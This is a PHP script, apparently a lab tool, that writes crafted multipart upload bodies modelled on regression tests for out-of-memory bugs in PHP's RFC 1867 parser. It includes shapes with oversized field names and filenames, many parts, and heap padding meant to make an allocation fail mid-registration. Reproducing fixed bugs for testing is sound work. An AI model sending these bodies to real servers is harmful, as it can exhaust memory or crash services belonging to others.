<?php
/* Multipart body generator — shapes taken from the public regression tests
 * in the upstream fix commit (tests/basic/oom_rfc1867_*.phpt).
 * Lab instrument only: no code-execution payload. */
const B = '---------------------------12345';

function part($out, string $headers): void {
    fwrite($out, '--' . B . "\r\n" . $headers . "\r\n\r\n");
}
function fill($out, int $bytes, string $ch = 'A'): void {
    while ($bytes > 0) {
        $n = min($bytes, 1 << 20);
        fwrite($out, str_repeat($ch, $n));
        $bytes -= $n;
    }
}

[$shape, $size] = [$argv[1] ?? 'huge_field_name', (int)($argv[2] ?? 6)];
$pad = (int)($argv[3] ?? 1344);
$out = fopen('php://stdout', 'wb');

switch ($shape) {
case 'huge_field_name':          // the field name alone must be retained
    part($out, 'Content-Disposition: form-data; name="');
    fill($out, $size * 1048576);
    fwrite($out, "\"\r\n\r\nv\r\n");
    break;
case 'huge_array_name':          // param, abuf and array_index are copies
    part($out, 'Content-Disposition: form-data; name="');
    fill($out, $size * 1048576);
    fwrite($out, "[k]\"; filename=\"f.txt\"\r\nContent-Type: text/plain\r\n\r\nx\r\n");
    break;
case 'huge_filename':            // weight lands on $_FILES[full_path]
    part($out, 'Content-Disposition: form-data; name="u"; filename="');
    fill($out, $size * 1024);
    fwrite($out, "\"\r\nContent-Type: text/plain\r\n\r\nx\r\n");
    break;
case 'many_parts':               // the $_FILES table itself is the allocation
    for ($i = 0; $i < $size; $i++) {
        part($out, "Content-Disposition: form-data; name=\"u$i\"; filename=\"f$i.txt\"\r\nContent-Type: text/plain");
        fwrite($out, "x\r\n");
    }
    break;
case 'padded_registration':      // pad the heap so the next alloc fails mid-registration
    part($out, 'Content-Disposition: form-data; name="pad"');
    fill($out, $pad * 1024);
    fwrite($out, "\r\n");
    part($out, 'Content-Disposition: form-data; name="');
    fill($out, 700 * 1024);
    fwrite($out, "[k]\"; filename=\"f.txt\"\r\nContent-Type: text/plain\r\n\r\nx\r\n");
    break;
default:
    fwrite(STDERR, "unknown shape\n");
    exit(2);
}
fwrite($out, '--' . B . "--\r\n");
